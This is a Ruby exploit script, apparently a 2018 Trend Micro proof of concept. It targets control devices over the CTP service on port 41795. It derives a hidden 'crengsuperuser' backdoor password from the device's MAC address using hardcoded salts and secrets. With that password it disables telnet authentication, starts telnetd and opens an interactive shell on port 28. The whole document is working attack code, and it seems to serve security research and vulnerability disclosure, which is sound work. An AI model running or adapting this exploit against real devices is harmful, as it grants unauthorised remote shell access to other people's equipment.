#!/usr/bin/env ruby
# coding: utf-8
require 'socket'
require 'expect'
require 'openssl'
require 'pty'

# password generator algorithm
def pwdgen(mac_addr, eng = false)
  # password charset
  alphanum = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

  # for crsuperuser
  #   sha_salt = "bZtB9aGX)Dyf044z"
  #   secret = ")7Ln1E98wA#7Vv)#"
  # for crengsuperuser
  #   sha_salt = "M1Lj&54'itmLHZq#"
  #   secret = "Q#Jy707i7)q5y9'N"
  sha_salt = (eng ? "M1Lj&54'itmLHZq#" : "bZtB9aGX)Dyf044z")
  secret = (eng ? "Q#Jy707i7)q5y9'N" : ")7Ln1E98wA#7Vv)#")
  
  # create sha1 digest using mac (padded with nulls to 8 bytes) and salt
  sha = OpenSSL::Digest::SHA1.new
  sha.update(mac_addr + "\x00\x00")
  sha.update(sha_salt)

  # create rc4 cipher with sha1 digest as key and no iv
  cipher = OpenSSL::Cipher::RC4.new
  cipher.encrypt
  cipher.key = sha.digest[0,16]

  # encrypt secret string with rc4 cipher
  encrypted = cipher.update(secret) + cipher.final

  # use each byte of encrypted string to calculate index in alphanum for next password char (16x)
  pwd = ""
  16.times {|i| pwd << alphanum[encrypted[i].unpack("C")[0] % alphanum.length]}

  return pwd
end

if not ARGV[0]
  puts "no target ip specified"
  exit(-1)
end

ADDR = ARGV[0]
CTP_PORT = 41795
TELNET_PORT = 28

opened = false
begin
  s = TCPSocket.new(ADDR,CTP_PORT)

  s.write("\r\n")
  if s.expect(/>$/,1)
    s.write("estat\r\n")
    resp = s.expect(/((?:[0-9a-f]{2}\.){5}[0-9a-f]{2}).+>$/m,1)
    if resp
      mac_addr = resp.last.split(".").map {|byte| byte.to_i(16)}.pack("C*")
      engpwd = pwdgen(mac_addr, eng = true)
      s.write("sudo -SN:crengsuperuser -SP:#{engpwd} regedit \\comm\\telnetd addval UseAuthentication DWORD 0\r\n")
      s.expect(/>$/,1)
      s.write("sudo -SN:crengsuperuser -SP:#{engpwd} launch \\windows\\services.exe /params start tel0:\r\n")
      opened = true
      puts "Debug shell opened!"
    else
      puts "Couldn't calculate backdoor password"
    end
  else
    puts "CTP port closed"
  end
          
  s.close
rescue Errno::ECONNREFUSED
  puts "CTP port closed"
end

sleep 3

PTY.spawn("telnet #{ADDR} #{TELNET_PORT}") do |reader, writer|
  begin
    while true do
      reader.gets
      resp = nil
      resp = reader.expect(/^\\.*> $/)[0]
      printf(resp) if resp
      writer.puts(STDIN.gets)
    end
  rescue Interrupt, Errno::EIO
  end
end

# © 2018, Trend Micro Incorporated
